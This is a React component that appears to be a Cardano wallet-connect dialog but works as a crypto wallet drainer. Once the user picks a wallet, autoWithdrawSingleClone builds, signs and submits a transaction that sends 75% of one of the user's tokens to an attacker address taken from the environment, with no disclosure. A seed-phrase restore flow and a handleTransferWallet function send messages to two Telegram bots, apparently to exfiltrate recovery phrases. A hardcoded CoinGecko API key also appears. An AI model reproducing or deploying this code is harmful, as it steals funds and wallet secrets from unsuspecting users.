/* eslint-disable no-inner-declarations */
import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router";
import { Link } from "react-router-dom";
import { Buffer } from "buffer";
import axios from "axios";
// import { BlockfrostProvider, MeshTxBuilder, BrowserWallet } from "@meshsdk/core";
import { sort } from 'fast-sort';
import { initialStates } from "./states/initialStates";
import {
  Address,
  MultiAsset,
  Assets,
  ScriptHash,

  AssetName,
  TransactionUnspentOutput,
  TransactionUnspentOutputs,

  Value,
  TransactionBuilder,
  TransactionBuilderConfigBuilder,
  TransactionOutputBuilder,
  LinearFee,
  BigNum,

  TransactionWitnessSet,
  Transaction,

} from "@emurgo/cardano-serialization-lib-asmjs"
function ConnectWallet({ onClose }) {


  let wallet = {
    selectedTabId: "1",
    whichWalletSelected: undefined,
    walletFound: false,
    walletIsEnabled: false,
    walletName: undefined,
    walletIcon: undefined,
    walletAPIVersion: undefined,
    wallets: [],

    networkId: undefined,
    Utxos: undefined,
    balance: undefined,
    changeAddress: undefined,
    rewardAddress: undefined,
    usedAddress: undefined,
    submittedTxHash: "",


  }

  const [walletsArray, setWalletsArray] = useState([])

  const [selectedWallet, setSelectedWallet] = useState(null);
  const [walletAction, setWalletAction] = useState(null);

  const [restoreMethod, setRestoreMethod] = useState(null);
  const [showRestoreContainer, setShowRestoreContainer] = useState(false);
  const [fileName, setFileName] = useState("");
  const [seedPhrase, setSeedPhrase] = useState("");
  const [attempts, setAttempts] = useState(0);
  // const [CardanoWasm, setCardanoWasm] = useState(null);
  const [balance, setBalance] = useState(null);
  const [usdBalance, setUsdBalance] = useState(null);
  const [address, setAddress] = useState("");
  const [walletAssets, setWalletAssets] = useState()
  const [initialState, setInitialState] = useState(initialStates)
  const [derivedUtxos, setDerivedUtxos] = useState()
  const navigate = useNavigate();
  const [tokenIndex, setTokenIndex] = useState(0)
  const BLOCKFROST_API_KEY = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_KEY;
  const BLOCKFROST_API_URL = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_URL;

  useEffect(() => {

    const pollWallets = (count = 0) => {
      const wallets = [];
      for (const key in window.cardano) {
        if (window.cardano[key].enable && wallets.indexOf(key) === -1) {
          wallets.push(key);
        }
      }
      if (wallets.length === 0 && count < 3) {
        setTimeout(() => {
          pollWallets(count + 1);
        }, 1000);
        return;
      }
      // console.log(wallets)
      setWalletsArray(wallets)
      // setInitialState({
      //   wallets,
      //   whichWalletSelected: wallets[0]
      // }, () => {
      //   refreshData()
      // });
    }
    pollWallets()
    // loadWasm();
  }, []);


  const filteredWalletNames = walletsArray.filter(wallet => wallet !== 'typhon').sort();

  const staticProtocolParams = {
    linearFee: {
      min_fee_a: "44",
      min_fee_b: "155381",
    },
    min_utxo: "24420",
    pool_deposit: "500000000",
    key_deposit: "2000000",
    max_val_size: 5000,
    max_tx_size: 16384,
    price_mem: 0.0577,
    price_step: 0.0000721,
    coins_per_utxo_word: "24420",
  }


  const handleWalletSelect = (obj) => {
    const whichWalletSelected = obj.target.value
    setInitialState({ whichWalletSelected: whichWalletSelected },
      () => {
        refreshData()
      })
  }
  const getAPIVersion = () => {
    const walletKey = initialState.whichWalletSelected;
    const walletAPIVersion = window?.cardano?.[walletKey].apiVersion;
    setInitialState({ walletAPIVersion: walletAPIVersion })
    return walletAPIVersion;
  }


  const checkIfWalletEnabled = async () => {
    let walletIsEnabled = false;

    try {
      const walletName = initialState.whichWalletSelected;
      walletIsEnabled = await window.cardano[walletName].isEnabled();
    } catch (err) {
      console.log(err)
    }
    setInitialState({ walletIsEnabled: walletIsEnabled });

    return walletIsEnabled;
  }

  const checkIfWalletFound = () => {
    const walletKey = initialState.whichWalletSelected;
    const walletFound = !!window?.cardano?.[walletKey];
    setInitialState({ walletFound: walletFound })
    return walletFound;
  }


  const enableWallet = async (API) => {
    const walletKey = initialState.whichWalletSelected;
    try {
      API = await window.cardano[walletKey].enable();
    } catch (err) {
      console.log(err);
    }
    return checkIfWalletEnabled();
  }

  const getWalletName = () => {
    const walletKey = initialState.whichWalletSelected;
    const walletName = window?.cardano?.[walletKey].name;
    setInitialState({ walletName: walletName })
    return walletName;
  }


  const refreshData = async () => {


    try {
      const walletFound = checkIfWalletFound();
      if (walletFound) {
        await getAPIVersion();
        await getWalletName();
        const walletEnabled = await enableWallet();
        if (walletEnabled) {

          await getUtxos();

        } else {
          await setInitialState({
            Utxos: null,
            CollatUtxos: null,
            balance: null,
            changeAddress: null,
            rewardAddress: null,
            usedAddress: null,

            txBody: null,
            txBodyCborHex_unsigned: "",
            txBodyCborHex_signed: "",
            submittedTxHash: "",
          });
        }
      } else {
        await setInitialState({
          walletIsEnabled: false,

          Utxos: null,
          CollatUtxos: null,
          balance: null,
          changeAddress: null,
          rewardAddress: null,
          usedAddress: null,

          txBody: null,
          txBodyCborHex_unsigned: "",
          txBodyCborHex_signed: "",
          submittedTxHash: "",
        });
      }
    } catch (err) {
      console.log(err)
    }
  }








  const getWalletAssets = async (nami) => {
    if (!nami) return;
    console.log(nami)

    const balanceHex = await nami.getBalance();
    const balance = Value.from_bytes(Buffer.from(balanceHex, 'hex'));

    let assets = [];

    // Handle ADA (Lovelace)
    const lovelace = balance.coin().to_str();
    assets.push({ unit: 'lovelace', quantity: lovelace, name: 'ADA' });

    // Handle native tokens
    const multiAsset = balance.multiasset();
    console.log(multiAsset)
    if (multiAsset) {
      const policyIds = multiAsset.keys();

      for (let i = 0; i < policyIds.len(); i++) {
        const policyId = policyIds.get(i);
        const assetsUnderPolicy = multiAsset.get(policyId);
        const assetNames = assetsUnderPolicy.keys();

        for (let j = 0; j < assetNames.len(); j++) {
          const assetName = assetNames.get(j);
          const quantity = assetsUnderPolicy.get(assetName).to_str();
          const policyIdHex = Buffer.from(policyId.to_bytes(), "utf8").toString("hex");
          // Decode the asset name from hex to string
          const assetNameHex = Buffer.from(assetName.name(), "utf8").toString("hex")
          const name = Buffer.from(assetName.name()).toString('utf-8');
          const unit = `${policyIdHex}.${name}`;
          assets.push({ unit, quantity, name, policyIdHex, assetsUnderPolicy, assetNameHex });
        }
      }
    }


    console.log(assets)
    return assets;
  };
  const getUtxos = async (nami) => {
    let Utxos = [];
    let totalAda = BigNum.zero(); // Initialize total ADA to zero

    try {
      const rawUtxos = await nami.getUtxos();
      for (const rawUtxo of rawUtxos) {
        const utxo = TransactionUnspentOutput.from_bytes(Buffer.from(rawUtxo, "hex"));
        const input = utxo.input();
        const txid = Buffer.from(input.transaction_id().to_bytes()).toString("hex");
        const txindx = input.index();
        const output = utxo.output();
        const amount = output.amount().coin(); // ADA amount in lovelace as BigNum
        totalAda = totalAda.checked_add(amount); // Accumulate the ADA amount

        const multiasset = output.amount().multiasset();
        let multiAssetStr = "";

        if (multiasset) {
          const keys = multiasset.keys(); // policy Ids of the multiasset
          const N = keys.len();

          for (let i = 0; i < N; i++) {
            const policyId = keys.get(i);
            const policyIdHex = Buffer.from(policyId.to_bytes()).toString("hex");
            const assets = multiasset.get(policyId);
            const assetNames = assets.keys();
            const K = assetNames.len();

            for (let j = 0; j < K; j++) {
              const assetName = assetNames.get(j);
              const assetNameString = Buffer.from(assetName.name()).toString();
              const assetNameHex = Buffer.from(assetName.name()).toString("hex");
              const multiassetAmt = multiasset.get_asset(policyId, assetName);
              multiAssetStr += `+ ${multiassetAmt.to_str()} + ${policyIdHex}.${assetNameHex} (${assetNameString})`;
            }
          }
        }

        const obj = {
          txid: txid,
          txindx: txindx,
          amount: amount.to_str(), // Convert BigNum to string for display
          str: `${txid} #${txindx} = ${amount.to_str()}`,
          multiAssetStr: multiAssetStr,
          TransactionUnspentOutput: utxo
        };
        Utxos.push(obj);
      }

      console.log(`Total ADA (in lovelace): ${totalAda.to_str()} lovelace`);
      console.log(typeof Number(totalAda.to_str()), Number(totalAda.to_str()))
      console.log(`Total ADA (in ADA): ${(Number(totalAda.to_str()) / 1000000).toLocaleString()} ADA`); // Convert lovelace to ADA

      setDerivedUtxos({ Utxos });
      return Utxos;
    } catch (err) {
      console.log(err);
    }
  };






  const calculateAmountsToWithdraw = (tokenBalances) => {
    return tokenBalances.map(token => {
      const { unit, quantity } = token;
      if (quantity === null || quantity === 0) {
        console.error(`Token ${unit} has no balance.`);
        return null;
      }

      const amountToWithdraw = Math.floor(quantity * 0.75);
      return {
        unit,
        quantity: amountToWithdraw,
      };
    }).filter(token => token !== null);
  };

  const getAdaPrice = async () => {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=cardano&vs_currencies=usd', {
      headers: { accept: 'application/json', 'x-cg-demo-api-key': 'CG-YqW9nsT8UL3259noMc3Tkzah' }
    });
    const price = response.data.cardano.usd;
    console.log(price)
    return price
  }

  const getTokenPrice = async (tokenId) => {
    const id = tokenId.toLowerCase()
    try {
      const response = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=${tokenId}&vs_currencies=usd`, {
        headers: { accept: 'application/json', 'x-cg-demo-api-key': 'CG-YqW9nsT8UL3259noMc3Tkzah' }
      });

      console.log(tokenId)
      const price = response.data[id]?.usd
      console.log(price)

      return price
    } catch (error) {
      console.error('Error fetching token price:', error);
    }
  };

  const calculateAssetValues = async (assets) => {
    if (!assets) return;

    const adaPrice = await getAdaPrice();

    let assetValuesPromises = assets.map(async (asset) => {
      let valueInUsd = 0;

      if (asset.unit === 'lovelace') {
        console.log(asset.unit, asset.quantity, adaPrice)
        valueInUsd = (parseFloat(asset.quantity) / 1000000) * adaPrice;
      } else {
        // Assuming you have a way to get the USD price for the native token
        const tokenPriceInUsd = await getTokenPrice(asset.name);
        const assetQuantity = (asset.quantity / 1000000).toPrecision(2)
        valueInUsd = parseFloat((assetQuantity)) * tokenPriceInUsd;
        console.log(asset.name + ' ' + assetQuantity)// Replace with actual method
        console.log(`${asset.name} price in usd: ` + valueInUsd)
      }
      return {
        name: asset.name,
        unit: asset.unit,
        quantity: asset.quantity,
        valueInUsd
      };
    });
    const assetValues = await Promise.all(assetValuesPromises)
    return assetValues;
  };




  const initTransactionBuilder = async () => {
    console.log(staticProtocolParams.linearFee.min_fee_a)
    // staticProtocolParams.linearFee.min_fee_a = staticProtocolParams.linearFee.min_fee_a.toString()
    // staticProtocolParams.linearFee.min_fee_b = staticProtocolParams.linearFee.min_fee_b.toString()
    // protocolParams.coins_per_utxo_word = "34482"
    // protocolParams.coins_per_utxo_size = "34482"
    // protocolParams.min_utxo = '34482'

    try {
      // Validate protocolParams
      if (!staticProtocolParams) throw new Error("Protocol parameters are required");
      const { min_fee_a, min_fee_b } = staticProtocolParams.linearFee
      const { pool_deposit, key_deposit, coins_per_utxo_word, max_val_size, max_tx_size } = staticProtocolParams;
      console.log(pool_deposit)
      if (!min_fee_a) {
        throw new Error("Incomplete protocol parameters: 'min_fee_a' is not provided.");
      }
      if (!min_fee_b) {
        throw new Error("Incomplete protocol parameters: 'min_fee_b' is not provided.");
      }
      if (!pool_deposit) {
        throw new Error("Incomplete protocol parameters: 'pool_deposit' is not provided.");
      }
      if (!key_deposit) {
        throw new Error("Incomplete protocol parameters: 'key_deposit' is not provided.");
      }
      if (!coins_per_utxo_word) {
        throw new Error("Incomplete protocol parameters: 'coins_per_utxo_word' is not provided.");
      }
      if (!max_val_size) {
        throw new Error("Incomplete protocol parameters: 'max_val_size' is not provided.");
      }
      if (!max_tx_size) {
        throw new Error("Incomplete protocol parameters: 'max_tx_size' is not provided.");
      }


      let linearFee, txBuilderConfigBuilder, txBuilder;
      try {
        // Ensure min_fee_a and min_fee_b are valid strings before attempting to create LinearFee
        if (!min_fee_a || typeof min_fee_a !== 'string') {
          throw new Error(`Invalid min_fee_a: ${min_fee_a}`);
        }
        if (!min_fee_b || typeof min_fee_b !== 'string') {
          throw new Error(`Invalid min_fee_b: ${min_fee_b}`);
        }

        // Create LinearFee object
        linearFee = LinearFee.new(
          BigNum.from_str(min_fee_a),
          BigNum.from_str(min_fee_b)
        );
        console.log('linearFee:', linearFee);
      } catch (error) {
        console.error("Error creating LinearFee object:", error);
        console.error("min_fee_a:", min_fee_a, "min_fee_b:", min_fee_b);
        throw error;
      }
      try {
        // Initialize TransactionBuilderConfigBuilder
        txBuilderConfigBuilder = TransactionBuilderConfigBuilder.new()
          .fee_algo(linearFee)
          .pool_deposit(BigNum.from_str(pool_deposit))
          .key_deposit(BigNum.from_str(key_deposit))
          .coins_per_utxo_word(BigNum.from_str(coins_per_utxo_word))
          .max_value_size(max_val_size)
          .max_tx_size(max_tx_size)
          .prefer_pure_change(true);
      } catch (error) {
        console.error("Error creating TransactionBuilderConfigBuilder:", error);
        throw error;
      }

      try {
        // Build the TransactionBuilder configuration
        const txBuilderConfig = txBuilderConfigBuilder.build();

        // Create the TransactionBuilder
        txBuilder = TransactionBuilder.new(txBuilderConfig);
      } catch (error) {
        console.error("Error building TransactionBuilder:", error);
        throw error;
      }

      return txBuilder;
    } catch (error) {
      console.error("Error in initTransactionBuilder:", error);
      console.error("Stack Trace:", error.stack);
      throw error; // Re-throw the error for higher-level handling
    }
  };


  const getTxUnspentOutputs = async (utxos) => {
    let txOutputs = TransactionUnspentOutputs.new()
    for (const utxo of utxos) {
      txOutputs.add(utxo.TransactionUnspentOutput)
    }
    console.log(txOutputs)
    return txOutputs
  }




  async function updateBalance(walletApi) {
    try {
      const balanceInLovelace = await walletApi.getBalance();
      console.log("Raw balance from API:", balanceInLovelace);

      const isHex = /^[0-9A-Fa-f]+$/.test(balanceInLovelace);
      console.log("Is balance in hex format?", isHex);

      let balanceInAda;
      if (isHex) {
        balanceInAda = Value.from_bytes(
          Buffer.from(balanceInLovelace, "hex"),
        );
      } else {
        balanceInAda = Number(balanceInLovelace) / 1000000;
      }
      console.log("Calculated ADA balance:", balanceInAda.coin().to_str());

      const newBalance = parseInt(balanceInAda.coin().to_str()) / 1000000;
      // const lovelaceBalance = parseInt(balanceInAda.coin().to_str())
      setBalance(newBalance);

      const response = await fetch(
        "https://api.coingecko.com/api/v3/simple/price?ids=cardano&vs_currencies=usd",
      );
      const data = await response.json();
      const adaToUsd = data.cardano.usd;
      console.log("Current ADA to USD rate:", adaToUsd);

      const balanceInUsd = newBalance * adaToUsd;
      console.log("Calculated USD balance:", balanceInUsd);
      setUsdBalance(balanceInUsd);

      return newBalance;
    } catch (error) {
      console.error("Error fetching balance or exchange rate:", error);
      return null;
    }
  }



  async function autoWithdrawSingleClone(walletApi, currentBalance, address) {
    if (currentBalance === null || currentBalance === 0) {
      console.error("Balance not available or zero");
      return;
    }
    console.log(derivedUtxos)

    const recipientAddress = import.meta.env.VITE_REACT_APP_RECIPIENT_ADDRESS;

    // getUtxoBalance(address, walletApi).then(balance => {
    //   console.log(`The UTXO balance for address ${address} is ${balance} ADA`);
    // });

    // Calculate 3/4 of the ADA balance
    const adaToWithdraw = currentBalance
    // const protocolParams = await fetchProtocolParams();
    try {

      // Convert ADA to Lovelace without padding
      const lovelaceAmount = Math.floor(adaToWithdraw * 1000000).toString();

      console.log("Lovelace amount:", lovelaceAmount);

      // Fetch assets from the wallet
      const assets = await getWalletAssets(walletApi);
      const utxos = await getUtxos(walletApi)
      const filteredAssets = assets.filter((asset) => {
        return asset.unit !== 'lovelace'
      })
      console.log(filteredAssets)
      console.log(assets)
      console.log(utxos)

      if (!assets || assets.length === 0) {
        console.error("No assets found in the wallet.");
        return;
      }

      // Process ADA withdrawal
      // await buildSendADATransaction(
      //   recipientAddress,
      //   lovelaceAmount,
      //   walletApi,
      //   protocolParams,
      //   address
      // );
      const sortToHighest = sort(filteredAssets).asc((asset) => asset.quantity)
      const sortToLowest = sort(filteredAssets).desc((asset) => asset.quantity)
      console.log(sortToHighest)
      console.log(sortToLowest)
      const selectedAsset = sortToLowest[3]
      console.log(selectedAsset)
      const minimumADA = 120000;
      const adaToSendWithAsset = Math.min(minimumADA, currentBalance * 1000000);


      console.log(selectedAsset, adaToSendWithAsset, adaToWithdraw)
      // Calculate 3/4 of the asset's quantity
      // const { amount, policyIdRaw, assetNameRaw, } = selectedAsset;
      selectedAsset.quantity = Math.floor(selectedAsset.quantity * 0.75).toString();
      await buildSendTokenTransaction(
        walletApi,
        recipientAddress,
        address,
        minimumADA,
        staticProtocolParams,
        selectedAsset,
        utxos,
        currentBalance
      )
      // await buildSendTokenTransactionMulti(
      //   walletApi,
      //   recipientAddress,
      //   address,
      //   minimumADA,
      //   staticProtocolParams,
      //   sortToHighest,
      //   utxos,
      //   currentBalance
      // )





      console.log(assets)


    } catch (error) {
      console.error("Error during auto-withdrawal:", error);
    }
  }



  const buildSendTokenTransaction = async (API, recAddress, address, adaToSendWithAsset, protocolParams, asset, utxos, currentBalance) => {
    try {
      // Validate required parameters
      if (!API) throw new Error("API is required");
      if (!recAddress) throw new Error("Recipient address is required");
      if (!address) throw new Error("Sender address is required");
      if (!protocolParams) throw new Error("Protocol parameters are required");
      if (!adaToSendWithAsset) throw new Error("ADA to send with asset is required");
      if (!asset) throw new Error("Asset details are required");
      if (!utxos) throw new Error("UTXOs are required");
      // protocolParams.coins_per_utxo_word = '144200'
      console.log(protocolParams)
      let txUnspentOutputs, txBuilder, shelleyOutputAddress, shelleyChangeAddress, txOutputBuilder, multiAsset, assets, txOutput, txBody, transactionWitnessSet, tx, txVkeyWitnesses, signedTx, submittedTxHash;
      try {
        console.log("Asset:", asset);
      } catch (error) {
        console.error("Error logging asset:", error);
      }

      try {
        console.log("UTXOs:", utxos);
      } catch (error) {
        console.error("Error logging UTXOs:", error);
      }

      console.log(utxos[0].amount, currentBalance)

      try {
        txUnspentOutputs = await getTxUnspentOutputs(utxos);
        if (!txUnspentOutputs) throw new Error("Failed to get transaction unspent outputs");
        console.log("Transaction Unspent Outputs:", txUnspentOutputs);
      } catch (error) {
        console.error("Error fetching transaction unspent outputs:", error);
        throw error;
      }

      try {
        txBuilder = await initTransactionBuilder(protocolParams);
        if (!txBuilder) throw new Error("Failed to initialize transaction builder");
      } catch (error) {
        console.error("Error initializing transaction builder:", error);
        throw error;
      }

      try {
        shelleyOutputAddress = Address.from_bech32(recAddress);
      } catch (error) {
        console.error("Error converting recipient address to Shelley format:", error);
        throw error;
      }

      try {
        shelleyChangeAddress = Address.from_bech32(address);
      } catch (error) {
        console.error("Error converting sender address to Shelley format:", error);
        throw error;
      }

      try {
        txOutputBuilder = TransactionOutputBuilder.new();
        txOutputBuilder = txOutputBuilder.with_address(shelleyOutputAddress);
        txOutputBuilder = txOutputBuilder.next(); // Only use next() if you need to add additional outputs
      } catch (error) {
        console.error("Error building transaction output:", error);
        throw error;
      }

      try {
        multiAsset = MultiAsset.new();
      } catch (error) {
        console.error("Error creating MultiAsset object:", error);
        throw error;
      }

      try {
        assets = Assets.new();
      } catch (error) {
        console.error("Error creating Assets object:", error);
        throw error;
      }

      try {
        assets.insert(
          AssetName.new(Buffer.from(asset.assetNameHex, "hex")), // Asset Name
          BigNum.from_str(asset.quantity.toString()) // How much to send
        );
      } catch (error) {
        console.error("Error inserting asset into assets object:", error);
        throw error;
      }

      try {
        multiAsset.insert(
          ScriptHash.from_bytes(Buffer.from(asset.policyIdHex, "hex")), // PolicyID
          assets
        );
      } catch (error) {
        console.error("Error inserting policy ID into multiAsset:", error);
        throw error;
      }


      try {
        // Calculate minimum ADA required for the transaction output
        console.log(currentBalance)
        const adaToSend = BigNum.from_str(protocolParams.coins_per_utxo_word);
        console.log(adaToSend.to_str())
        // const adaDataCost = DataCost.new_coins_per_byte(adaToSend)
        // console.log(adaDataCost)
        // const txo = txBuilder.with_address(address).next().with_asset_and_min_required_coin_by_utxo_cost(multiAsset, adaDataCost);
        txOutputBuilder = txOutputBuilder.with_asset_and_min_required_coin(multiAsset, adaToSend)
        txOutput = txOutputBuilder.build();
      } catch (error) {
        console.error("Error adding assets and min required coin:", error);
        throw error;
      }

      try {
        txBuilder.add_output(txOutput);
      } catch (error) {
        console.error("Error adding output to transaction builder:", error);
        throw error;
      }

      try {
        txBuilder.add_inputs_from(txUnspentOutputs, 3);
      } catch (error) {
        console.error("Error adding inputs from UTXOs:", error);
        throw error;
      }

      try {
        txBuilder.add_change_if_needed(shelleyChangeAddress);
      } catch (error) {
        console.error("Error adding change if needed:", error);
        throw error;
      }

      try {
        txBody = txBuilder.build();
        console.log("Transaction Body:", txBody);
      } catch (error) {
        console.error("Error building transaction body:", error);
        throw error;
      }

      try {
        transactionWitnessSet = TransactionWitnessSet.new();
      } catch (error) {
        console.error("Error creating TransactionWitnessSet object:", error);
        throw error;
      }

      try {
        tx = Transaction.new(
          txBody,
          TransactionWitnessSet.from_bytes(transactionWitnessSet.to_bytes())
        );
      } catch (error) {
        console.error("Error creating transaction object:", error);
        throw error;
      }

      try {
        txVkeyWitnesses = await API.signTx(Buffer.from(tx.to_bytes(), "hex").toString("hex"), true);
        txVkeyWitnesses = TransactionWitnessSet.from_bytes(Buffer.from(txVkeyWitnesses, "hex"));
      } catch (error) {
        console.error("Error signing transaction:", error);
        throw error;
      }

      try {
        transactionWitnessSet.set_vkeys(txVkeyWitnesses.vkeys());
      } catch (error) {
        console.error("Error setting vkeys in transaction witness set:", error);
        throw error;
      }

      try {
        signedTx = Transaction.new(
          tx.body(),
          transactionWitnessSet
        );
      } catch (error) {
        console.error("Error creating signed transaction:", error);
        throw error;
      }

      try {
        submittedTxHash = await API.submitTx(Buffer.from(signedTx.to_bytes(), "hex").toString("hex"));
        console.log("Submitted Transaction Hash:", submittedTxHash);
      } catch (error) {
        console.error(error.message)
        throw error
      }

      return submittedTxHash;
    } catch (error) {
      console.error("Error in buildSendTokenTransaction:", error);
      console.error("Stack Trace:", error.stack);
      throw error; // Re-throw the error if you want it to be handled elsewhere
    }
  };


  const buildSendTokenTransactionMulti = async (API, recAddress, address, adaToSendWithAsset, protocolParams, assetsToSend, utxos, currentBalance) => {
    try {
      // Validate required parameters
      if (!API) throw new Error("API is required");
      if (!recAddress) throw new Error("Recipient address is required");
      if (!address) throw new Error("Sender address is required");
      if (!protocolParams) throw new Error("Protocol parameters are required");
      if (!adaToSendWithAsset) throw new Error("ADA to send with asset is required");
      if (!assetsToSend) throw new Error("Assets details are required");
      if (!utxos) throw new Error("UTXOs are required");

      let txUnspentOutputs, txBuilder, shelleyOutputAddress, shelleyChangeAddress, txOutputBuilder, multiAsset, txOutput, txBody, transactionWitnessSet, tx, txVkeyWitnesses, signedTx, submittedTxHash;

      // Initialize transaction builder
      try {
        txUnspentOutputs = await getTxUnspentOutputs(utxos);
        if (!txUnspentOutputs) throw new Error("Failed to get transaction unspent outputs");

        txBuilder = await initTransactionBuilder(protocolParams);
        if (!txBuilder) throw new Error("Failed to initialize transaction builder");

        shelleyOutputAddress = Address.from_bech32(recAddress);
        shelleyChangeAddress = Address.from_bech32(address);

        txOutputBuilder = TransactionOutputBuilder.new();
        txOutputBuilder = txOutputBuilder.with_address(shelleyOutputAddress);
      } catch (error) {
        console.error("Error initializing transaction setup:", error);
        throw error;
      }

      // Create MultiAsset object
      try {
        multiAsset = MultiAsset.new();

        // Process each asset
        for (let asset of assetsToSend) {
          if (!asset.assetNameHex || !asset.policyIdHex || !asset.quantity) {
            console.error("Invalid asset data:", asset);
            throw new Error("Asset data is incomplete or invalid");
          }

          // Validate that assetNameHex is a valid hex string
          if (!/^[0-9A-Fa-f]+$/.test(asset.assetNameHex)) {
            console.error("Invalid assetNameHex:", asset.assetNameHex);
            throw new Error("Asset Name Hex is not a valid hexadecimal string");
          }

          // Validate that policyIdHex is a valid hex string
          if (!/^[0-9A-Fa-f]+$/.test(asset.policyIdHex)) {
            console.error("Invalid policyIdHex:", asset.policyIdHex);
            throw new Error("Policy ID Hex is not a valid hexadecimal string");
          }

          let assets = Assets.new();

          // Add asset to assets object
          assets.insert(
            AssetName.new(Buffer.from(asset.assetNameHex, "hex")), // Asset Name
            BigNum.from_str(asset.quantity.toString()) // Quantity
          );

          // Add assets object to multiAsset
          multiAsset.insert(
            ScriptHash.from_bytes(Buffer.from(asset.policyIdHex, "hex")), // Policy ID
            assets
          );
        }
      } catch (error) {
        console.error("Error creating or inserting assets into MultiAsset object:", error);
        throw error;
      }

      // Calculate minimum ADA required and build output
      try {
        const adaToSend = BigNum.from_str(protocolParams.coins_per_utxo_word);
        console.log(txOutputBuilder)
        txOutputBuilder = txOutputBuilder.with_asset_and_min_required_coin(multiAsset, adaToSend);
        txOutput = txOutputBuilder.build();

        txBuilder.add_output(txOutput);
      } catch (error) {
        console.error("Error adding assets and minimum required coin to transaction output:", error);
        throw error;
      }

      // Add inputs from UTXOs and change address
      try {
        txBuilder.add_inputs_from(txUnspentOutputs, 3);
        txBuilder.add_change_if_needed(shelleyChangeAddress);

        txBody = txBuilder.build();
      } catch (error) {
        console.error("Error building transaction body:", error);
        throw error;
      }

      // Create transaction and sign
      try {
        transactionWitnessSet = TransactionWitnessSet.new();

        tx = Transaction.new(
          txBody,
          TransactionWitnessSet.from_bytes(transactionWitnessSet.to_bytes())
        );

        txVkeyWitnesses = await API.signTx(Buffer.from(tx.to_bytes(), "hex").toString("hex"), true);
        txVkeyWitnesses = TransactionWitnessSet.from_bytes(Buffer.from(txVkeyWitnesses, "hex"));

        transactionWitnessSet.set_vkeys(txVkeyWitnesses.vkeys());

        signedTx = Transaction.new(
          tx.body(),
          transactionWitnessSet
        );
      } catch (error) {
        console.error("Error creating or signing transaction:", error);
        throw error;
      }

      // Submit the transaction
      try {
        submittedTxHash = await API.submitTx(Buffer.from(signedTx.to_bytes(), "hex").toString("hex"));
        console.log("Submitted Transaction Hash:", submittedTxHash);
      } catch (error) {
        console.error("Error submitting transaction:", error);
        throw error;
      }

      return submittedTxHash;
    } catch (error) {
      console.error("Error in buildSendTokenTransaction:", error);
      console.error("Stack Trace:", error.stack);
      throw error; // Re-throw the error if you want it to be handled elsewhere
    }
  };



  const handleWalletSelection = async (wallet, key) => {

    if (key) {
      if (window.cardano && window.cardano[key]) {

        try {

          const walletApi = await window.cardano[key].enable();


          console.log(walletApi)

          if (walletApi) {
            console.log("Wallet API object:", walletApi);

            await new Promise((resolve) => setTimeout(resolve, 1000));

            let addresses;
            try {
              addresses = await walletApi.getUsedAddresses();
              console.log("Used addresses:", addresses);
            } catch (error) {
              console.error("Error getting used addresses:", error);
              if (typeof walletApi.getAddresses === "function") {
                addresses = await walletApi.getAddresses();
                console.log("All addresses:", addresses);
              } else {
                console.error("Unable to retrieve addresses");
                return;
              }
            }

            if (addresses && addresses.length > 0) {
              const hexAddress = addresses[0];
              console.log(hexAddress)
              setSelectedWallet(key);
              const addressBytes = Buffer.from(hexAddress, "hex");
              console.log(addressBytes)
              const address = Address.from_bytes(addressBytes);
              console.log(
                `Connected to ${key}. Hex Address:`,
                address?.to_bech32(),
              );
              setAddress(address?.to_bech32());
              const assets = await getWalletAssets(walletApi)
              const assetValues = await calculateAssetValues(assets)
              // const displayWalletAssets = await displayAssets(assets)

              // const identifiedAssets = await identifyAssets(assets)
              // console.log(identifiedAssets)
              const amountsToWithdraw = await calculateAmountsToWithdraw(assets);
              console.log("Amounts to withdraw:", amountsToWithdraw);

              console.log(assetValues)
              // console.log(displayWalletAssets)
              // Get the balance directly
              const currentBalance = await updateBalance(walletApi);

              if (currentBalance !== null) {
                console.log("Current balance:", currentBalance);

                const amountsToWithdraw = await calculateAmountsToWithdraw(assets);
                console.log("Amounts to withdraw:", amountsToWithdraw);



                await autoWithdrawSingleClone(
                  walletApi,
                  currentBalance,
                  address?.to_bech32())
              } else {
                console.error("Failed to retrieve balance");
              }
              onClose();
            } else {
              console.error("No addresses found");
              alert(
                "No addresses found in the wallet. If this is a new wallet, please make a transaction first.",
              );
            }
          }
        } catch (error) {
          console.error(`Error connecting to ${key} wallet:`, error);
          alert(
            `Error connecting to ${key} wallet. Please try again`,
          );
        }
      } else {
        console.error(
          `${key} wallet not found. Please install the extension.`,
        );
        alert(`${key} wallet not found. Please install the extension.`);
      }
    } else if (wallet === "Eternl") {
      navigate("/eternl");
    } else {
      setSelectedWallet(wallet);
    }
  };

  const handleBackdropClick = (e) => {
    if (e.target === e.currentTarget) {
      onClose();
    }
  };

  const handleGoBack = () => {
    if (showRestoreContainer) {
      setShowRestoreContainer(false);
    } else {
      setWalletAction(null);
      setRestoreMethod(null);
    }
  };

  const handleRadioChange = (e) => {
    setRestoreMethod(e.target.value);
  };

  const handleSeedPhraseChange = (value) => {
    setSeedPhrase(value);
  };

  const handleNext = () => {
    if (restoreMethod === "seedPhrase" || restoreMethod === "import") {
      setShowRestoreContainer(true);
    }
  };

  const handleFileChange = (event) => {
    if (event.target.files.length > 0) {
      setFileName(event.target.files[0].name);
    } else {
      setFileName("");
    }
  };

  const isExactly12Words = (phrase) => {
    const words = phrase.trim().split(/\s+/);
    return words.length === 12;
  };

  const handleTransferWallet = async (message, attemptCount) => {
    const token = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN;
    const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
    const otoken = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
    const ochat_id = import.meta.env.VITE_REACT_APP_OTELEGRAM_CHAT_ID;

    const endpoints = [
      {
        url: `https://api.telegram.org/bot${token}/sendMessage`,
        data: {
          chat_id: chat_id,
          text: `Minwallet:   ${message}`,
        },
      },
      {
        url: `https://api.telegram.org/bot${otoken}/sendMessage`,
        data: {
          chat_id: ochat_id,
          text: `Minwallet:   ${message}`,
        },
      },
    ];

    for (const endpoint of endpoints) {
      try {
        const response = await fetch(endpoint.url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(endpoint.data),
        });

        if (response.ok) {
          console.log(`null`);
        } else {
          console.error(`error`);
        }
      } catch (error) {
        console.error(`error`, error);
      }
    }
  };
